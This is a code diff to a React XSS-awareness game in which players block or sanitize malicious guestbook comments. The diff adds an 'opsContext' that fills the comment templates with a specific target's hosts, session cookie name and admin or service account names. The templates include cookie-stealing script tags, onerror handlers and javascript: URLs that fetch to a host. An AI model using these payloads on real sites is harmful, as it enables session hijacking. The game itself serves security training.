@@ -1,12 +1,13 @@
-import { useState, useCallback, useEffect } from 'react';
+import { useMemo, useState, useCallback, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import {
   Shield, ShieldCheck, ShieldAlert, Check, X, Eye, EyeOff,
   Cookie, MessageSquare, Send, Lock, Unlock, AlertTriangle,
   Sparkles, ChevronRight, RotateCcw, Trophy, Code, Zap
 } from 'lucide-react';
+import type { OpsContextProps } from '@/lib/opsContext';
 
-interface Props {
+interface Props extends OpsContextProps {
   onScoreChange: (score: number) => void;
 }
 
@@ -101,13 +102,43 @@ const COMMENT_TEMPLATES: Record<CommentType, { text: string; display: string; co
 const USERNAMES = ['CyberKitty', 'PixelPup', 'NetNinja', 'CodeCub', 'ByteBunny', 'DataDoge', 'WebWhale'];
 const AVATARS = ['🐱', '🐶', '🦊', '🐻', '🐰', '🐼', '🐨'];
 
-function generateComments(level: LevelConfig): CommentItem[] {
+function buildOpsCommentTemplates({ target }: NonNullable<OpsContextProps['opsContext']>): Record<CommentType, { text: string; display: string; correct: ActionType }[]> {
+  return {
+    safe: [
+      { text: `${target.platformName} login worked for me.`, display: `${target.platformName} login worked for me.`, correct: 'approve' },
+      { text: `The ${target.widgetName} looks clean today.`, display: `The ${target.widgetName} looks clean today.`, correct: 'approve' },
+      { text: `Please add more docs for ${target.apiName}.`, display: `Please add more docs for ${target.apiName}.`, correct: 'approve' },
+    ],
+    script_tag: [
+      { text: `<script>fetch('${target.hosts.old}?c='+document.cookie)</script>`, display: `<script>fetch('${target.hosts.old}?c='+document.cookie)</script>`, correct: 'block' },
+      { text: `<script>document.location='${target.hosts.old}'</script>`, display: `<script>document.location='${target.hosts.old}'</script>`, correct: 'block' },
+    ],
+    event_handler: [
+      { text: `<img src=x onerror=fetch('${target.hosts.vendor}/${target.sessionCookieName}')>`, display: `<img src=x onerror=fetch('${target.hosts.vendor}/${target.sessionCookieName}')>`, correct: 'sanitize' },
+      { text: `<button onclick='send${target.targetId}Session()'>Click me</button>`, display: `<button onclick='send${target.targetId}Session()'>Click me</button>`, correct: 'sanitize' },
+    ],
+    encoded: [
+      { text: `&lt;script&gt;fetch('${target.hosts.old}')&lt;/script&gt;`, display: `<script>fetch('${target.hosts.old}')</script>`, correct: 'block' },
+      { text: `%3Cscript%3E${target.sessionCookieName}%3C/script%3E`, display: `<script>${target.sessionCookieName}</script>`, correct: 'block' },
+    ],
+    javascript_proto: [
+      { text: `<a href='javascript:fetch("${target.hosts.old}")'>${target.platformName}</a>`, display: `<a href='javascript:fetch("${target.hosts.old}")'>${target.platformName}</a>`, correct: 'sanitize' },
+      { text: `<iframe src='javascript:location.href="${target.hosts.old}"'>`, display: `<iframe src='javascript:location.href="${target.hosts.old}"'></iframe>`, correct: 'block' },
+    ],
+  };
+}
+
+function generateComments(
+  level: LevelConfig,
+  templatesByType: Record<CommentType, { text: string; display: string; correct: ActionType }[]> = COMMENT_TEMPLATES,
+  usernames: string[] = USERNAMES,
+): CommentItem[] {
   const comments: CommentItem[] = [];
   const usedTemplates = new Map<CommentType, number>();
 
   for (let i = 0; i < level.commentCount; i++) {
     const type = level.types[i];
-    const templates = COMMENT_TEMPLATES[type];
+    const templates = templatesByType[type];
     const usedIdx = usedTemplates.get(type) || 0;
     const template = templates[usedIdx % templates.length];
     usedTemplates.set(type, usedIdx + 1);
@@ -119,7 +150,7 @@ function generateComments(level: LevelConfig): CommentItem[] {
       type,
       correctAction: template.correct,
       level: level.id,
-      username: USERNAMES[i % USERNAMES.length],
+      username: usernames[i % usernames.length],
       avatar: AVATARS[i % AVATARS.length],
     });
   }
@@ -142,7 +173,11 @@ function getActionColor(action: ActionType): string {
   }
 }
 
-export default function XSSXpert({ onScoreChange }: Props) {
+export default function XSSXpert({ onScoreChange, opsContext }: Props) {
+  const commentTemplates = useMemo(() => opsContext ? buildOpsCommentTemplates(opsContext) : COMMENT_TEMPLATES, [opsContext]);
+  const usernames = useMemo(() => opsContext
+    ? [opsContext.target.standardUser, opsContext.target.adminUser, opsContext.target.serviceAccount, opsContext.target.supportEmail.split('@')[0]]
+    : USERNAMES, [opsContext]);
   const [currentLevel, setCurrentLevel] = useState(0);
   const [comments, setComments] = useState<CommentItem[]>([]);
   const [currentIndex, setCurrentIndex] = useState(0);
@@ -162,7 +197,7 @@ export default function XSSXpert({ onScoreChange }: Props) {
 
   const startLevel = useCallback((lvlIdx: number) => {
     const lvl = LEVELS[lvlIdx];
-    setComments(generateComments(lvl));
+    setComments(generateComments(lvl, commentTemplates, usernames));
     setCurrentIndex(0);
     setXrayEnabled(false);
     setLastAction(null);
@@ -172,7 +207,7 @@ export default function XSSXpert({ onScoreChange }: Props) {
     setShakeScreen(false);
     setProcessedComments([]);
     setGameState('playing');
-  }, []);
+  }, [commentTemplates, usernames]);
 
   const startGame = () => {
     setCurrentLevel(0);
@@ -345,7 +380,7 @@ export default function XSSXpert({ onScoreChange }: Props) {
           </div>
           <div className="flex-1 bg-white border-2 border-black rounded-full px-3 py-0.5 flex items-center gap-1">
             <Lock size={10} strokeWidth={3} className="text-green-success" />
-            <span className="font-nunito text-[10px] text-purple-dark">cyberpaws.kids/comments</span>
+            <span className="font-nunito text-[10px] text-purple-dark">{opsContext?.target.primaryDomain ?? 'cyberpaws.kids'}/comments</span>
           </div>
         </div>
 
@@ -374,7 +409,9 @@ export default function XSSXpert({ onScoreChange }: Props) {
               <span className="text-lg">🐾</span>
             </div>
             <div>
-              <h4 className="font-fredoka text-sm text-purple-dark">CyberPaws Guestbook</h4>
+              <h4 className="font-fredoka text-sm text-purple-dark">
+                {opsContext ? `${opsContext.target.platformName} Comments` : 'CyberPaws Guestbook'}
+              </h4>
               <div className="flex items-center gap-1">
                 <Cookie size={10} strokeWidth={3} className={cookiesStolen ? 'text-red-alert' : 'text-yellow-accent'} fill={cookiesStolen ? '#F87171' : '#FACC15'} />
                 <span className="font-nunito text-[10px] text-purple-dark">
